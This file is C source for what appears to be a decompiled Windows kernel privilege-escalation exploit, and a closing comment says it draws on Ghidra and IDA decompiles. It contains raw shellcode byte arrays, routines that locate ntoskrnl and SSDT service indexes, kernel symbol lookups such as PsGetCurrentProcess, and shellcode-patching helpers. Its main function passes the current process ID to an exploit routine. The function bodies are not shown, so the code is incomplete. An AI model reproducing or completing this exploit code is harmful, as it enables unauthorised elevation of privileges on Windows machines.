# Specific functions currently #

#include<stdio.h>
#include<windows.h>

#define WindowName L"h"
#define ClassName L"STATIC"
#define aPrkmtx L"prkMtx"
#define SystemModuleInformation 0xb

WCHAR aCnFormSyncExFBC[]=L"cnFormSyncExFBC";
char acCnFormSyncExFBC[]="cnFormSyncExFBC";
WCHAR aCnFormVoidFBC[]=L"cnFormVoidFBC";
char acCnFormVoidFBC[]="cnFormVoidFBC";
char aNtShutdownSystem[]="NtShutdownSystem";
WCHAR aUser32[]=L"user32.dll";
char aMenuItemFromPoint[]="MenuItemFromPoint";
char aRedrawWindow[]="RedrawWindow";
char aNtoskrnl[]="ntoskrnl.exe";
char aNtkrnlpa[]="ntkrnlpa.exe";
char aNtdll[]="ntdll.dll";
char aNtQuerySystemInformation[]="NtQuerySystemInformation";
char aDbgPrint[]="DbgPrint";
char aDbgPrintEx[]="DbgPrintEx";
char aLdrGetProcedureAddress[]="LdrGetProcedureAddress";
char aPsGetCurrentProcess[]="PsGetCurrentProcess";
char aExcept_handler3[]="_except_handler3";
char aMsvcrt[]="msvcrt";

byte s1[]={0x8b,0x58,0x28,0x89,0x58,0x24,0x68,0x0,0x0,0x0,0x0,0x58,0x68,0x0,
0x0,0x0,0x0,0xff,0xd0,0x83,0xc4,0x04,0xc3,0x0};

byte s2[]={0xba,0x0,0x03,0xfe,0x7f,0xff,0x12,0xc2,0x1c,0x0,0x0,0x0};

typedef DWORD (WINAPI *l_NtQuerySystemInformation)(DWORD SystemInformationClass,PVOID info,DWORD LEN,DWORD* ReturnLength);
typedef struct _SYSTEM_MODULE_INFORMATION
{//size 0x11c
	DWORD      Reserved[2];
	PVOID      Base;
	DWORD      Size;
	DWORD      Flags;
	USHORT     Index;
	USHORT     Unknown;
	USHORT     LoadCount;
	USHORT     ModuleNameOffset;
	CHAR       ImageName[256];
}SYSTEM_MODULE_INFORMATION,PSYSTEM_MODULE_INFORMATION;
typedef struct _L_smi
{
	DWORD       NumberOfModules;
	SYSTEM_MODULE_INFORMATION smi;
}L_smi,PL_smi;

l_NtQuerySystemInformation m_NtQuerySystemInformation=NULL;
/*
typedef struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR   szCSDVersion[ 128 ];     // Maintenance string for PSS usage
} OSVERSIONINFOA, *POSVERSIONINFOA, *LPOSVERSIONINFOA;
*/


typedef struct _ANSI_STRING
{
	USHORT      Length;
	USHORT      MaximumLength;
	PCHAR       Buffer;
}ANSI_STRING,*PANSI_STRING;

typedef struct _UNICODE_STRING
{
	USHORT       Length;
	USHORT       MaximumLength;
	PWCHAR       Buffer;
}UNICODE_STRING,*PUNICODE_STRING;

typedef DWORD (WINAPI *l_LdrGetProcedureAddress)(PVOID DllHandle,const ANSI_STRING* ProcedureName,ULONG ProcedureNumber,PVOID ProcedureAddress);

typedef struct _os_data
{
	DWORD         UserModeLoadedNtoskrnlBase;//this ntoskrnl.exe is loaded by LoadLibrary
	DWORD         r0NtoskrnlBase;//the original one
	DWORD         MajorVersion;
	DWORD         MinorVersion;
	DWORD         nummy1;
	DWORD         nummy2;
	DWORD         aLdrGetProcedureAddress;//addr of LdrGetProcedureAddress
	DWORD         aDbgPrint;//addr of DbgPrint
	DWORD         aDbgPrintEx;//addr of DbgPrintEx
}OS_DATA,*POS_DATA;

typedef struct _all_data
{
	byte       v_6c[0x18];
	OS_DATA    OsData;
}ALL_DATA,PALL_DATA;

typedef  struct _struct1
{
	DWORD     size;
	DWORD     num1;
	DWORD     num2;
	DWORD     num3;
	DWORD     num4;
	DWORD     num5;
	DWORD     num6;
	DWORD     num7;
	DWORD     num8;
	DWORD     num9;
	DWORD     num10;
	DWORD     num11;
}STRUCT1,*PSTRUCT1;

typedef struct _struct2
{
	ULONG        num1;
	ULONG        num2;
	ULONG        num3;
}STRUCT2,*PSTRUCT2;

void fun();
DWORD GetFuncAddress(OS_DATA* OsData,const char* FuncName);
DWORD HiGetFuncAddress(ALL_DATA* AllData,DWORD* handler3);
void unknown(OS_DATA* OsDdata);
DWORD GetSystemInfo(DWORD InfoClass,DWORD* Buffer,DWORD* len);
DWORD GetSystemModuleInfo(const char* ModuleName);
DWORD GetOsData(DWORD* LibModule);
DWORD LowGetUser32ServiceIndex(const char* ServiceName);
DWORD GetServiceIndexInSSDT(const char* ServiceName);
DWORD GetUser32ServiceIndex(DWORD* Index1,DWORD* Index2);
DWORD FillCode1(byte* code,DWORD CodeLength,ULONG buffer,ULONG FuncAddr1,ULONG offset1,ULONG FuncAddr2,DWORD offset2);
DWORD   FillCode2(byte* code,DWORD CodeLength,ULONG buffer,byte   NumberOfBytesToBalanceStack,DWORD  offset);
DWORD GetExceptHandler3(ULONG addr);
DWORD V6(PVOID  Buffer,HWND window,PVOID fn,PVOID shell,DWORD len);
HANDLE I_mutex();
DWORD ork(PVOID fn,PVOID shell,DWORD len);

char er_message[1024]={0};
ULONG      addr_except_handler3=0X0;

int main(int argc,char* argv)
{
    DWORD    buffer[5]={0};
	buffer[0]=GetCurrentProcessId();
	ork(fun,(PVOID)buffer,0x14);
	return 0;
}

// some from the internet, github, google,  Ghidra decompiles, IDA Decompiles, etc.
